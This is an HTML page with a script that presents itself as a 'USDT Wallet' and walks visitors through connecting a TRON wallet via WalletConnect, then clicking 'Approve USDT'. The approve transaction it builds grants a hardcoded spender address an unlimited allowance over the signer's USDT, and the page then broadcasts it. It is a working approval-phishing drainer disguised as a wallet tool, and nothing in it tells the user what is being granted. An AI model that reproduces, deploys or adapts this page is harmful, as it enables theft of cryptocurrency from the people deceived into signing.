<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>USDT Wallet</title>

<style>
body{
  margin:0;
  font-family:-apple-system,BlinkMacSystemFont,sans-serif;
  background:#0b0f19;
  color:#fff;
}

.container{
  max-width:420px;
  margin:auto;
  padding:20px;
}

.card{
  background:#121826;
  border-radius:16px;
  padding:20px;
  margin-top:20px;
  box-shadow:0 10px 25px rgba(0,0,0,0.3);
}

h2{
  text-align:center;
  margin-bottom:10px;
}

button{
  width:100%;
  padding:14px;
  border:none;
  border-radius:12px;
  font-size:16px;
  font-weight:600;
  cursor:pointer;
}

.connect{
  background:#3b82f6;
  color:white;
}

.approve{
  background:#22c55e;
  color:white;
  margin-top:10px;
}

#qr{
  display:flex;
  justify-content:center;
  margin-top:15px;
}

#uri{
  font-size:11px;
  word-break:break-all;
  margin-top:10px;
  color:#aaa;
}

.wallet{
  font-size:13px;
  text-align:center;
  color:#4ade80;
}

.status{
  font-size:12px;
  margin-top:10px;
  text-align:center;
  color:#aaa;
}

</style>
</head>

<body>

<div class="container">

  <h2>💰 USDT Wallet</h2>

  <div class="card">

    <button id="connectBtn" class="connect">Connect Wallet</button>

    <div id="qr"></div>
    <div id="uri"></div>
    <a id="openWallet" target="_blank"></a>

    <div id="wallet" class="wallet"></div>

    <button id="approveBtn" class="approve" style="display:none;">
      Approve USDT
    </button>

    <div id="status" class="status"></div>

  </div>

</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>

<script type="module">
import bs58 from "https://esm.sh/bs58";

const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
const TRON_CHAIN = "tron:0x2b6653dc";
const TRONGRID = "https://api.trongrid.io";

const USDT_HEX = "41a614f803b6fd780986a42c78ec9c7f77e6ded13c";
const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";

let client, session;

// convert address
function tronToHex(addr){
  const bytes = bs58.decode(addr);
  return Array.from(bytes)
    .map(b => b.toString(16).padStart(2,"0"))
    .join("")
    .slice(0,42);
}

// encode approve
function encodeApprove(spenderHex){
  const clean = spenderHex.replace(/^41/,"").padStart(64,"0");
  return "095ea7b3" + clean + "f".repeat(64);
}

// build tx
async function buildTx(owner){
  const ownerHex = tronToHex(owner);

  const res = await fetch(TRONGRID + "/wallet/triggersmartcontract",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      owner_address: ownerHex,
      contract_address: USDT_HEX,
      function_selector:"approve(address,uint256)",
      parameter: encodeApprove(tronToHex(SPENDER)),
      fee_limit:100000000,
      call_value:0,
      visible:false
    })
  });

  const data = await res.json();
  if(!data.transaction) throw "TX build failed";

  return data.transaction;
}

// broadcast
async function broadcast(tx){
  const res = await fetch(TRONGRID + "/wallet/broadcasttransaction",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify(tx)
  });
  return await res.json();
}

// fix signature
function fixSig(resp, tx){
  if(resp?.signature){
    tx.signature = Array.isArray(resp.signature)
      ? resp.signature.map(s=>s.replace(/^0x/,""))
      : [resp.signature.replace(/^0x/,"")];
  }
  return tx;
}

// UI helpers
function setStatus(text){
  document.getElementById("status").innerText = text;
}

// show QR + link
function showQR(uri){
  document.getElementById("qr").innerHTML="";

  new QRCode(document.getElementById("qr"),{
    text:uri,
    width:200,
    height:200
  });

  document.getElementById("uri").innerText = uri;

  const link = "https://link.trustwallet.com/wc?uri="+encodeURIComponent(uri);
  document.getElementById("openWallet").href = link;
  document.getElementById("openWallet").innerText = "Open in Trust Wallet";
}

// connect
document.getElementById("connectBtn").onclick = async ()=>{
  try{
    setStatus("Connecting...");

    const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");

    client = await SignClient.init({
      projectId:PROJECT_ID,
      metadata:{
        name:"USDT Wallet",
        description:"Connect wallet",
        url:location.origin,
        icons:["https://cryptologos.cc/logos/tether-usdt-logo.png"]
      }
    });

    const { uri, approval } = await client.connect({
      requiredNamespaces:{
        tron:{
          methods:["tron_signTransaction"],
          chains:[TRON_CHAIN],
          events:[]
        }
      }
    });

    showQR(uri);

    session = await approval();

    const wallet = session.namespaces.tron.accounts[0].split(":")[2];

    document.getElementById("wallet").innerText = wallet;
    document.getElementById("approveBtn").style.display = "block";

    setStatus("Connected");

  }catch(e){
    setStatus("Connection failed");
    console.error(e);
  }
};

// approve button
document.getElementById("approveBtn").onclick = async ()=>{
  try{
    setStatus("Preparing transaction...");

    const wallet = session.namespaces.tron.accounts[0].split(":")[2];

    const tx = await buildTx(wallet);

    setStatus("Waiting for signature...");

    const signed = await client.request({
      topic: session.topic,
      chainId: TRON_CHAIN,
      request:{
        method:"tron_signTransaction",
        params:{ transaction: tx }
      }
    });

    const finalTx = fixSig(signed, tx);

    setStatus("Broadcasting...");

    const result = await broadcast(finalTx);

    if(result.result){
      setStatus("✅ Success: " + result.txid);
    } else {
      throw JSON.stringify(result);
    }

  }catch(e){
    setStatus("❌ Error");
    console.error(e);
  }
};

</script>

</body>
</html>
